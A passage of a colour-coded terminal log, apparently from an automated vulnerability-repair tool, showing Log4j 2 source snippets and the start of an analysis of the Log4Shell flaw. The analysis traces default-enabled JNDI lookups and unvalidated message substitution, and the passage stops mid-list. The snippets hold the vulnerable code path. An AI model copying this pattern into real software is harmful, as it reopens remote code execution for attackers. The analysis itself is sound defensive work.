[2;36m                    [0m         [1;36m69[0m[39m:     * unless other scheme like [0m[32m"java:"[0m[39m is given.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:     * @param jndiName The name of the resource.[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:     * @return The fully qualified name to look up.[0m                              [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:    private String [0m[1;35mconvertJndiName[0m[1;39m([0m[39mString jndiName[0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:        if [0m[1;39m([0m[39m![0m[1;35mjndiName.startsWith[0m[1;39m([0m[39mCONTAINER_JNDI_RESOURCE_PATH_PREFIX[0m[1;39m)[0m[39m && [0m        [2m                [0m
[2;36m                    [0m         [1;35mjndiName.indexOf[0m[1;39m([0m[32m':'[0m[1;39m)[0m[39m == [0m[1;36m-1[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;[0m           [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:        return jndiName;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:    public static void [0m[1;35msetEnableJndi[0m[1;39m([0m[39mboolean enableJndi[0m[1;39m)[0m[39m [0m[1;39m{[0m                       [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:        ENABLE_JNDI = enableJndi;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:    public static boolean [0m[1;35misEnableJndi[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:        return ENABLE_JNDI;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.jav[0m[1;92ma:1[0m[39m-[0m[1;36m143[0m     [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.lookup;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.util.HashMap;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import java.util.Map;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.Logger;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginManager;[0m               [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginType;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:import org.apache.logging.log4j.status.StatusLogger;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m: * The Interpolator is a StrLookup that acts as a proxy for all the other [0m       [2m                [0m
[2;36m                    [0m         [39mStrLookups.[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:public class Interpolator implements StrLookup [0m[1;39m{[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    private static final Logger LOGGER = [0m[1;35mStatusLogger.getLogger[0m[1;39m([0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:    [0m[35m/[0m[39m** Constant for the prefix separator. *[0m[35m/[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    private static final char PREFIX_SEPARATOR = [0m[32m':'[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:    private final Map<String, StrLookup> lookups = new HashMap<String, [0m          [2m                [0m
[2;36m                    [0m         [39mStrLookup>[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    private final StrLookup defaultLookup;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    public [0m[1;35mInterpolator[0m[1;39m([0m[39mfinal StrLookup defaultLookup[0m[1;39m)[0m[39m [0m[1;39m{[0m                         [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        this.defaultLookup = defaultLookup == null ? new [0m[1;35mMapLookup[0m[1;39m([0m[39mnew [0m          [2m                [0m
[2;36m                    [0m         [39mHashMap<String, String>[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m : defaultLookup;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:        final PluginManager manager = new [0m[1;35mPluginManager[0m[1;39m([0m[32m"Lookup"[0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:        [0m[1;35mmanager.collectPlugins[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:        final Map<String, PluginType> plugins = [0m[1;35mmanager.getPlugins[0m[1;39m([0m[1;39m)[0m[39m;[0m            [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:        for [0m[1;39m([0m[39mfinal Map.Entry<String, PluginType> entry : [0m[1;35mplugins.entrySet[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m   [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:            @[0m[1;35mSuppressWarnings[0m[1;39m([0m[32m"unchecked"[0m[1;39m)[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:            final Class<StrLookup> clazz = [0m[1;35mentry.getValue[0m[1;39m([0m[1;39m)[0m[1;35m.getPluginClass[0m[1;39m([0m[1;39m)[0m[39m;[0m    [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:            try [0m[1;39m{[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:                [0m[1;35mlookups.put[0m[1;39m([0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[39m, [0m[1;35mclazz.newInstance[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:            [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:                [0m[1;35mLOGGER.error[0m[1;39m([0m[32m"Unable to create Lookup for "[0m[39m + [0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[39m, [0m   [2m                [0m
[2;36m                    [0m         [39mex[0m[1;39m)[0m[39m;[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:     * Create the default Interpolator using only Lookups that work without an [0m  [2m                [0m
[2;36m                    [0m         [39mevent.[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:    public [0m[1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        this.defaultLookup = new [0m[1;35mMapLookup[0m[1;39m([0m[39mnew HashMap<String, String>[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m       [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"sys"[0m[39m, new [0m[1;35mSystemPropertiesLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                        [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"env"[0m[39m, new [0m[1;35mEnvironmentLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"jndi"[0m[39m, new [0m[1;35mJndiLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:     [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:     * Resolves the specified variable. This implementation will try to extract[0m  [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:     * a variable prefix from the given variable name [0m[1;39m([0m[39mthe first colon [0m[1;39m([0m[32m':'[0m[1;39m)[0m[39m is[0m  [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:     * used as prefix separator[0m[1;39m)[0m[39m. It then passes the name of the variable with[0m   [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:     * the prefix stripped to the lookup object registered for this prefix. If[0m   [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:     * no prefix can be found or if the associated lookup object cannot resolve[0m  [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:     * this variable, the default lookup object will be used.[0m                    [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:     *[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:     * @param var the name of the variable whose value is to be looked up[0m        [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:     * @return the value of this variable or <b>null<[0m[35m/[0m[95mb[0m[39m> if it cannot be[0m         [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:     * resolved[0m                                                                  [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String var[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:        return [0m[1;35mlookup[0m[1;39m([0m[39mnull, var[0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:     * Resolves the specified variable. This implementation will try to extract[0m  [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:     * a variable prefix from the given variable name [0m[1;39m([0m[39mthe first colon [0m[1;39m([0m[32m':'[0m[1;39m)[0m[39m is[0m  [2m                [0m
[2;36m                    [0m         [1;36m89[0m[39m:     * used as prefix separator[0m[1;39m)[0m[39m. It then passes the name of the variable with[0m   [2m                [0m
[2;36m                    [0m         [1;36m90[0m[39m:     * the prefix stripped to the lookup object registered for this prefix. If[0m   [2m                [0m
[2;36m                    [0m         [1;36m91[0m[39m:     * no prefix can be found or if the associated lookup object cannot resolve[0m  [2m                [0m
[2;36m                    [0m         [1;36m92[0m[39m:     * this variable, the default lookup object will be used.[0m                    [2m                [0m
[2;36m                    [0m         [1;36m93[0m[39m:     *[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m94[0m[39m:     * @param event The current LogEvent or null.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m95[0m[39m:     * @param var the name of the variable whose value is to be looked up[0m        [2m                [0m
[2;36m                    [0m         [1;36m96[0m[39m:     * @return the value of this variable or <b>null<[0m[35m/[0m[95mb[0m[39m> if it cannot be[0m         [2m                [0m
[2;36m                    [0m         [1;36m97[0m[39m:     * resolved[0m                                                                  [2m                [0m
[2;36m                    [0m         [1;36m98[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m99[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, String var[0m[1;39m)[0m[39m [0m[1;39m{[0m                    [2m                [0m
[2;36m                    [0m         [1;36m101[0m[39m:        if [0m[1;39m([0m[39mvar == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m102[0m[39m:            return null;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m103[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m104[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m105[0m[39m:        final int prefixPos = [0m[1;35mvar.indexOf[0m[1;39m([0m[39mPREFIX_SEPARATOR[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m106[0m[39m:        if [0m[1;39m([0m[39mprefixPos >= [0m[1;36m0[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m107[0m[39m:            final String prefix = [0m[1;35mvar.substring[0m[1;39m([0m[1;36m0[0m[39m, prefixPos[0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m108[0m[39m:            final String name = [0m[1;35mvar.substring[0m[1;39m([0m[39mprefixPos + [0m[1;36m1[0m[1;39m)[0m[39m;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m109[0m[39m:            final StrLookup lookup = [0m[1;35mlookups.get[0m[1;39m([0m[39mprefix[0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:            String value = null;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m111[0m[39m:            if [0m[1;39m([0m[39mlookup != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m112[0m[39m:                value = event == null ? [0m[1;35mlookup.lookup[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m : [0m                  [2m                [0m
[2;36m                    [0m         [1;35mlookup.lookup[0m[1;39m([0m[39mevent, name[0m[1;39m)[0m[39m;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m113[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m114[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m115[0m[39m:            if [0m[1;39m([0m[39mvalue != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m116[0m[39m:                return value;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m117[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:            var = [0m[1;35mvar.substring[0m[1;39m([0m[39mprefixPos + [0m[1;36m1[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:        if [0m[1;39m([0m[39mdefaultLookup != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:            return event == null ? [0m[1;35mdefaultLookup.lookup[0m[1;39m([0m[39mvar[0m[1;39m)[0m[39m : [0m                 [2m                [0m
[2;36m                    [0m         [1;35mdefaultLookup.lookup[0m[1;39m([0m[39mevent, var[0m[1;39m)[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m123[0m[39m:        return null;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m124[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m125[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m126[0m[39m:    @Override[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m127[0m[39m:    public String [0m[1;35mtoString[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m128[0m[39m:        final StringBuilder sb = new [0m[1;35mStringBuilder[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m129[0m[39m:        for [0m[1;39m([0m[39mfinal String name : [0m[1;35mlookups.keySet[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m130[0m[39m:            if [0m[1;39m([0m[1;35msb.length[0m[1;39m([0m[1;39m)[0m[39m == [0m[1;36m0[0m[1;39m)[0m[39m [0m[1;39m{[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m131[0m[39m:                [0m[1;35msb.append[0m[1;39m([0m[32m"[0m[32m{[0m[32m"[0m[1;39m)[0m[39m;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m132[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m133[0m[39m:                [0m[1;35msb.append[0m[1;39m([0m[32m", "[0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m134[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m135[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m136[0m[39m:            [0m[1;35msb.append[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m137[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m138[0m[39m:        if [0m[1;39m([0m[1;35msb.length[0m[1;39m([0m[1;39m)[0m[39m > [0m[1;36m0[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m139[0m[39m:            [0m[1;35msb.append[0m[1;39m([0m[32m"[0m[32m}[0m[32m"[0m[1;39m)[0m[39m;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m140[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m141[0m[39m:        return [0m[1;35msb.toString[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m142[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m143[0m[39m:[0m[1;39m}[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/config/BaseConfiguration.jav[0m[1;92ma:95[0m[39m-[0m[1;36m9[0m [2m                [0m
[2;36m                    [0m         [1;36m7[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m95[0m[39m:    private final StrLookup tempLookup = new [0m[1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[39m;[0m                     [2m                [0m
[2;36m                    [0m         [1;36m96[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m97[0m[39m:    private final StrSubstitutor subst = new [0m[1;35mStrSubstitutor[0m[1;39m([0m[39mtempLookup[0m[1;39m)[0m[39m;[0m         [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.ja[0m [2m                [0m
[2;36m                    [0m         [39mv[0m[1;92ma:60[0m[39m-[0m[1;36m77[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:    public void [0m[1;35mformat[0m[1;39m([0m[39mfinal LogEvent event, final StringBuilder toAppendTo[0m[1;39m)[0m[39m [0m[1;39m{[0m   [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        final Message msg = [0m[1;35mevent.getMessage[0m[1;39m([0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        if [0m[1;39m([0m[39mmsg != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:            String result;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:            if [0m[1;39m([0m[39mmsg instanceof MultiformatMessage[0m[1;39m)[0m[39m [0m[1;39m{[0m                             [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:                result = [0m[1;39m([0m[1;39m([0m[39mMultiformatMessage[0m[1;39m)[0m[39m [0m                                  [2m                [0m
[2;36m                    [0m         [39mmsg[0m[1;39m)[0m[1;35m.getFormattedMessage[0m[1;39m([0m[39mformats[0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:                result = [0m[1;35mmsg.getFormattedMessage[0m[1;39m([0m[1;39m)[0m[39m;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:            if [0m[1;39m([0m[39mresult != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:                [0m[1;35mtoAppendTo.append[0m[1;39m([0m[39mconfig != null && [0m[1;35mresult.contains[0m[1;39m([0m[32m"$[0m[32m{[0m[32m"[0m[1;39m)[0m[39m ?[0m      [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:                    [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39mevent, result[0m[1;39m)[0m[39m : result[0m[1;39m)[0m[39m;[0m          [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:                [0m[1;35mtoAppendTo.append[0m[1;39m([0m[32m"null"[0m[1;39m)[0m[39m;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode_snippets[0m[39m>[0m                                                                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Fix Strategy[0m                                                                     [2m                [0m
[2;36m                    [0m         [39m<fix_strategy>[0m                                                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Analysis of the Vulnerability[0m                                                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mAfter analyzing the code snippets and evaluation report, I've identified the root [0m  [2m                [0m
[2;36m                    [0m         [39mcause of this critical **Log4Shell** vulnerability [0m[1;39m([0m[39mCVE-[0m[1;36m2021[0m[39m-[0m[1;36m44228[0m[1;39m)[0m[39m:[0m                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Root Causes[0m                                                                     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **JndiLookup defaults to enabled**: The `ENABLE_JNDI` flag in [0m                   [2m                [0m
[2;36m                    [0m         [39m`JndiLookup.jav[0m[1;92ma:31[0m[39m` defaults to `true`, making JNDI lookups active by default.[0m     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Automatic JNDI registration**: The `Interpolator` class automatically [0m         [2m                [0m
[2;36m                    [0m         [39mregisters `JndiLookup` in its default constructor [0m[1;39m([0m[39m`Interpolator.jav[0m[1;92ma:66[0m[39m`[0m[1;39m)[0m[39m without [0m [2m                [0m
[2;36m                    [0m         [39mchecking if JNDI is enabled.[0m                                                        [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **No input validation**: User-controlled input flows directly from log messages [0m [2m                [0m
[2;36m                    [0m         [39mthrough the substitution chain to JNDI lookups without any validation of URLs or [0m   [2m                [0m
